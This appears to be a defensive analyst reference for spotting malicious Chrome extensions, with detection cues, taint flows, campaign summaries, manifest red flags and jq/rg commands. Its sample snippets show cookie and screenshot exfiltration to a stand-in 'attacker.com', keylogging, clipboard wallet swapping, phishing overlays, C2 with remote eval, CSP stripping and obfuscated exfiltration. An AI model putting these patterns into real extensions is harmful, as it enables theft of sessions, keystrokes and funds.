# Threat Pattern Reference

## Critical Patterns to Investigate

### 1. Session Cookie Theft

**Pattern:**
```javascript
chrome.cookies.getAll({}, function(cookies) {
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(cookies)
    });
});
```

**Detection:** Taint flow from `chrome.cookies` → network sink

**Verification:**
- Check if cookies are filtered (e.g., only specific domains)
- Verify destination URL (legitimate API vs unknown domain)
- Check for encryption (still suspicious if external)

---

### 2. Cryptocurrency Wallet Hijacking

**Pattern A: Ethereum wallet override**
```javascript
Object.defineProperty(window, 'ethereum', {
    get: function() {
        return maliciousProvider;
    }
});
```

**Pattern B: Clipboard replacement**
```javascript
document.addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain', attackerWalletAddress);
});
```

**Detection:** String patterns for wallet APIs, clipboard manipulation

**Verification:**
- Search for `window.ethereum`, `window.solana`, `window.phantom`
- Check clipboard event listeners
- Look for wallet address regex patterns (0x[a-fA-F0-9]{40})

---

### 3. Keylogging

**Pattern:**
```javascript
let buffer = '';
document.addEventListener('keydown', function(e) {
    buffer += e.key;
    if (buffer.length > 100) {
        sendToServer(buffer);
        buffer = '';
    }
});
```

**Detection:** Event listeners + buffering + network transmission

**Verification:**
- Check if keystroke capture is scoped (e.g., only on extension popup)
- Verify no data leaves the extension
- Legitimate use: password managers (but should be well-documented)

---

### 4. Screen Capture / Surveillance

**Pattern:**
```javascript
chrome.tabs.captureVisibleTab(null, {}, function(screenshot) {
    fetch('https://attacker.com/screenshots', {
        method: 'POST',
        body: screenshot
    });
});
```

**Detection:** `captureVisibleTab`, `getDisplayMedia`, `tabCapture` permissions + network

**Verification:**
- Check when capture occurs (user-initiated vs automatic)
- Verify destination (cloud storage API vs unknown server)
- Look for excessive frequency (every 5s = surveillance)

---

### 5. Phishing via Iframe Overlay

**Pattern:**
```javascript
let iframe = document.createElement('iframe');
iframe.src = 'https://fake-login.com/gmail';
iframe.style = 'position:fixed; top:0; left:0; width:100%; height:100%; z-index:999999;';
document.body.appendChild(iframe);
```

**Detection:** Fullscreen iframe injection, fake login forms

**Verification:**
- Check iframe sources (legitimate domains vs typosquatting)
- Look for fake input fields (`input[type=password]`)
- Verify if extension has legitimate reason to overlay content

---

### 6. Command & Control (C2) Communication

**Pattern A: WebSocket**
```javascript
let ws = new WebSocket('wss://c2-server.com/control');
ws.onmessage = function(msg) {
    eval(msg.data); // Remote code execution
};
```

**Pattern B: Long polling**
```javascript
setInterval(function() {
    fetch('https://c2-server.com/commands')
        .then(r => r.text())
        .then(cmd => eval(cmd));
}, 5000);
```

**Detection:** WebSocket to unknown domains, periodic fetch + eval

**Verification:**
- Check domain reputation (VirusTotal results)
- Look for `eval()`, `Function()`, `new Function()` with remote data
- Verify if communication is legitimate (e.g., real-time chat extension)

---

### 7. CSP Bypass / Header Manipulation

**Pattern:**
```javascript
chrome.webRequest.onHeadersReceived.addListener(
    function(details) {
        let headers = details.responseHeaders;
        headers = headers.filter(h => h.name.toLowerCase() !== 'content-security-policy');
        return {responseHeaders: headers};
    },
    {urls: ["<all_urls>"]},
    ["blocking", "responseHeaders"]
);
```

**Detection:** Header removal in `webRequest` listener

**Verification:**
- Removing CSP = CRITICAL (enables arbitrary code injection)
- No legitimate reason for extensions to remove security headers
- Always flag as malicious

---

### 8. Obfuscated Exfiltration

**Pattern A: String rotation**
```javascript
const url = 'moc.rekcatta//:sptth'.split('').reverse().join('');
fetch(url, {method: 'POST', body: sensitiveData});
```

**Pattern B: Constructor chain**
```javascript
const evil = ([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]...].constructor('return fetch')());
```

**Detection:** High entropy strings, constructor chains, eval bypass

**Verification:**
- Deobfuscate strings manually or with tools
- Check if deobfuscated URL is in VirusTotal results
- High obfuscation = strong indicator of malicious intent

---

### 9. Settings Hijacking

**Pattern:**
```javascript
chrome.settings.searchEngines.setValue({
    value: 'https://search-hijacker.com/?q={searchTerms}&aff=xyz'
});
```

**Detection:** `chrome_settings_overrides` in manifest, affiliate parameters

**Verification:**
- Check if search URL contains affiliate codes
- Verify homepage/startup page overrides
- Compare with known hijacker campaigns

---

### 10. Steganography (Hidden Code in Images)

**Pattern:**
```javascript
let img = new Image();
img.src = 'icon.png';
img.onload = function() {
    let canvas = document.createElement('canvas');
    let ctx = canvas.getContext('2d');
    ctx.drawImage(img, 0, 0);
    let data = ctx.getImageData(0, 0, img.width, img.height).data;
    let code = extractCodeFromPixels(data); // Extracts hidden JS
    eval(code);
};
```

**Detection:** Canvas manipulation + eval, image data extraction

**Verification:**
- Check for canvas + `getImageData()` + eval patterns
- Extract image and analyze pixel data manually
- Recent campaigns: GhostPoster, PixelStealer

---

## Taint Analysis Flows

### Critical Sources (Input)
- `chrome.cookies.getAll()`
- `chrome.cookies.get()`
- `chrome.history.search()`
- `chrome.tabs.query()` + `chrome.tabs.sendMessage()`
- `chrome.storage.local.get()`
- `document.querySelector('input[type=password]').value`
- `navigator.clipboard.readText()`
- `chrome.webRequest` (intercepts credentials)

### Critical Sinks (Output)
- `fetch()` with POST/PUT
- `XMLHttpRequest.send()`
- `WebSocket.send()`
- `navigator.sendBeacon()`
- `chrome.runtime.sendMessage()` to external extension
- `document.createElement('img').src` (tracking pixel)

### High-Risk Flow Examples

**CRITICAL:**
```
chrome.cookies.getAll() → JSON.stringify() → fetch(external_url)
chrome.history.search() → btoa() → WebSocket.send()
document.querySelectorAll('input[type=password]') → forEach() → sendBeacon()
```

**SUSPICIOUS:**
```
chrome.storage.local.get() → fetch() // May be sync feature, check destination
chrome.tabs.captureVisibleTab() → chrome.storage.local.set() // Local screenshot, OK if no network
```

---

## Known Malicious Campaigns

### DarkSpectre (2024)
- **Target:** Productivity extensions (PDF tools, video downloaders)
- **Technique:** Session cookie theft via `chrome.cookies` + C2
- **IOCs:** Domains ending in `.top`, `.xyz` TLDs
- **Affected users:** 8.8M+

### ChatGPT Mods (2024-2025)
- **Target:** AI assistant browser extensions
- **Technique:** Facebook session hijacking
- **IOCs:** `facebook.com` in `host_permissions` + cookie exfiltration
- **Affected users:** 16 extensions removed

### GhostPoster (2025)
- **Target:** Social media automation tools
- **Technique:** Steganography (code hidden in PNG images)
- **IOCs:** Canvas API + `getImageData()` + eval
- **Affected users:** Unknown

### ZoomStealer (2024)
- **Target:** Fake Zoom extensions
- **Technique:** OAuth token theft during video calls
- **IOCs:** `zoom.us` typosquatting domains
- **Affected users:** 500K+

---

## VirusTotal Interpretation

**Threat levels:**
- **MALICIOUS:** 4+ vendors flagged (high confidence)
- **SUSPICIOUS:** 1-3 vendors flagged (medium confidence)
- **CLEAN:** 0 vendors flagged

**Common false positives:**
- `firebaseio.com` - Backend service, often flagged
- `cloudflare.net` - CDN, may have 1-2 flags
- `googleapis.com` - Google APIs, generally safe

**Red flags:**
- Newly registered domains (<90 days old)
- DGA-style domains (random characters)
- High-risk TLDs: `.top`, `.xyz`, `.tk`, `.ml`, `.ga`
- Multiple vendors flagging for phishing/malware

---

## AST Analysis Fields

When reading `ast_results` from report:

```json
{
  "data_exfiltration": [
    {
      "method": "POST",
      "destination": "https://attacker.com/collect",
      "payload_vars": ["userCookies", "historyData"],
      "file": "background.js",
      "line": 145
    }
  ],
  "network_calls": [
    {
      "type": "fetch",
      "url": "https://api.example.com/endpoint",
      "method": "GET",
      "file": "content.js",
      "line": 67
    }
  ]
}
```

**Analysis priority:**
1. Check `destination` against VirusTotal results
2. Verify `payload_vars` - do they contain sensitive data?
3. Read actual code to confirm data flow
4. Check if URL is hardcoded or dynamically generated

---

## Manifest.json Red Flags

### Dangerous Permission Combos

**CRITICAL (Always investigate):**
```json
{
  "permissions": ["cookies", "tabs", "<all_urls>"],
  "host_permissions": ["<all_urls>"]
}
```
→ Can steal sessions from ANY website

**HIGH (Requires review):**
```json
{
  "permissions": ["webRequest", "webRequestBlocking"],
  "host_permissions": ["<all_urls>"]
}
```
→ Can intercept ALL network traffic

**MEDIUM (Context-dependent):**
```json
{
  "permissions": ["clipboardRead", "storage"]
}
```
→ Can steal clipboard + store indefinitely

### Suspicious Manifest Fields

**External code loading:**
```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self' https://cdn.example.com; object-src 'self'"
  }
}
```
→ Allows loading JS from external CDN (risky)

**Settings overrides:**
```json
{
  "chrome_settings_overrides": {
    "search_provider": {
      "search_url": "https://search-hijacker.com/?q={searchTerms}&aff=12345"
    }
  }
}
```
→ Browser hijacking with affiliate fraud

---

## Investigation Checklist

### Phase 1: Initial Triage (5 min)
- [ ] Read `manifest.json` permissions
- [ ] Check risk score and level in report
- [ ] Review VirusTotal results for any MALICIOUS domains
- [ ] Scan for taint flows in report
- [ ] Note any campaign attribution

### Phase 2: Code Review (15-30 min)
- [ ] Read all `malicious_patterns` with severity=high
- [ ] Verify top 3 findings against actual code
- [ ] Search for obfuscation (eval, atob, high entropy)
- [ ] Check all `fetch()`/`XMLHttpRequest` destinations
- [ ] Trace taint flows manually in code

### Phase 3: Deep Dive (30-60 min)
- [ ] Deobfuscate any encoded strings
- [ ] Check all external domains against WHOIS
- [ ] Review entire background.js / content.js
- [ ] Test extension in isolated environment
- [ ] Document all confirmed threats

---

## Quick Commands

```bash
# Find high-severity patterns in report
jq '.malicious_patterns[] | select(.severity=="high")' report.json

# List all external domains
jq -r '.domain_intelligence[].domain' report.json | sort -u

# Get taint flow summary
jq '.taint_flows[] | "\(.source.api) → \(.sink.function)"' report.json

# Find all VirusTotal MALICIOUS domains
jq '.virustotal_results[] | select(.threat_level=="MALICIOUS") | .domain' report.json

# Extract all fetch() destinations from code
rg -oP "fetch\(['\"]https?://[^'\"]+['\"]" extensions/{id}/ | sort -u
```
